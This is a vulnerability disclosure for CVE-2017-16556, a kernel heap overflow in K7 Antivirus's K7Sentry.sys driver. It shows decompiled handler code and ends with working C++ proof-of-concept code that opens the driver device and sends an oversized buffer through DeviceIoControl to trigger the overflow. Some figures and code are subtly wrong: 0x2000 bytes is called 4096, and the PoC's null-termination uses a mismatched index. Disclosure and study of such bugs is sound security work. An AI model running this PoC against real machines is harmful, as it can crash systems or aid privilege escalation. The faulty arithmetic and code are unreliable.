# CVE-2017-16556

# Product / Component Affected

* **Product**: *K7 Antivirus Premium 15.1.0.53* 
* **Component**: *K7Sentry.sys 15.1.0.45*
  * SHA256: 7037F80EC73F4D6E2DFBD2AA675FF154F81AAB2FB7372680AAA1D2D41DB93771
  
# See also
[CVE-2017-16550](../CVE-2017-16550/readme.md)


# Details
The issue lies in the dispatch handler for the IRP_MJ_DEVICE_CONTROL (sub_00018FC0). The handler code for IoControlCode 0x950025A4 makes use of a string routine which doesn't have any length limitations on it with user data that has not been validated, leading to a heap overflow.

The following simplified code snippets are decompiled output that make up this issue.
 

```C++
// Dispatch handler routine...
// See: CVE-2017-16550 for the setup of the stIoControlBuffer
case 0x950025A0:
    v9 = 1;
    goto LABEL_117;
case 0x950025A4:
    // Follow the function call down to find the issue. 
    // Also known as: sub_15BB0
    v9 = PrintfBugInHere(&stIoControlBuffer);
    goto LABEL_117;
case 0x950025A8:
    v9 = sub_15A10(&stIoControlBuffer);
    goto LABEL_117;
```

```C++
int __stdcall PrintfBugInHere(IoControlBuffer *pIoControlBuffer)
{
    // ... Locals ...

    pszString = (WCHAR *)pIoControlBuffer->pInputBuffer;
    *pIoControlBuffer->pdwIoStatusInformation = 0;
    if ( dword_287A8 )
    {
        // In here...
        cStr = *pszString;
        
        // Note: If we passed in an invalid buffer as the input, or a zero length buffer then this 
        // would be an out-of-bounds read, however the more interesting bug is later! 
        if ( *pszString < 'A' || cStr > 'Z' )
        {
            if ( wcsnicmp(pszString, L"\\\\?\\Volume", 0xAu) )
                return 0;
            pUnk7 = g_PointToMagic_K7CM;
        }
        else
        {
            v3 = cStr - 'A';
            if ( &v11 != (int *)0xFFFFFFF1 )
            v12 = byte_49642[672 * v3];
            pUnk7 = (unk7 *)dword_49650[168 * v3];
        }
        if ( pUnk7 )
        {
            // In here...
            if ( v12 )
            {
                // In here... and call this function.
                // This is wher
                if ( !GetNtfsFileReferenceNumber_PossibleFlaw(pszString, &dwFileReferenceNumber) )
    
    // ... not required for to illustrate the vuln.
}
```

```C++
char __stdcall GetNtfsFileReferenceNumber_PossibleFlaw(WCHAR *pszDeviceName, PVOID out_FileReferenceNumber)
{
    wchar_t *pBuffer_0x2000; // esi
    // Other locals...

    pBuffer_0x2000 = (wchar_t *)ExAllocatePool(PagedPool, 0x2000u);
    if ( pBuffer_0x2000 )
    {
        // An attacker can control pszDeviceName. 
        swprintf(pBuffer_0x2000, L"%s\\%s", L"\\DosDevices", pszDeviceName);
```

Following the code through, it allocates 0x2000 (4096) bytes from PagedPool and then uses an unbounded format string function to create the *\DosDevices\\...* path. *pszDeviceName* has come directly from the input buffer and has not had any validation performed. Some of the issues include:
* A string that is is larger than the buffer it is going to be written to. In this example (as it is UNICODE), the string length would need to be larger than:
  * (0x2000 / 2) - strlen("\DosDevices") - 1
  * Convert bytes to UNICODE characters - so the buffer can hold 0x1000 characters
  * 0x1000 - 11 (length of \DosDevices) - 1 (middle slash) = 0xff4 (4084)
  * So any string we can pass in that is > 4084 length, we can cause a heap overflow on the PagePool heap
* Another option would be to pass in a non-zero termianted string. This would cause an out-of-bounds read on the input buffer, potentially leading to a BSOD. (Didn't try this, went for the first option).


# PoC Code
```C++
BYTE inBuffer[0x40000] = { 0 };
BYTE outBuffer[0x4000] = { 0 };
DWORD dwBytesReturned = 0;
PWSTR pszInBuffer = (PWSTR)inBuffer;
HANDLE hDevice = INVALID_HANDLE_VALUE;

// Open a handle to the device
hDevice = CreateFileW(L"\\\\.\\k7sentry", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

if (hDevice != INVALID_HANDLE_VALUE)
{
    // Fill it with a letter that isn't 0.
    for (DWORD i = 0; i < sizeof(inBuffer) / sizeof(WCHAR); ++i)
    {
        pszInBuffer[i] = 'C';
    }

    // Zero terminate teh string
    DWORD dwLastIndex = (sizeof(inBuffer) / sizeof(WCHAR)) - 1;
    inBuffer[dwLastIndex] = '\0';

    // Trigger the bug to cause to overflow on the PagePool heap.
    if (!DeviceIoControl(hDevice, 0x950025A4, inBuffer, sizeof(inBuffer), outBuffer, sizeof(outBuffer), &dwBytesReturned, NULL))
    {
        printf("Error: DeviceIoControl failed: 0x%08x\r\n", GetLastError());
    }
}

```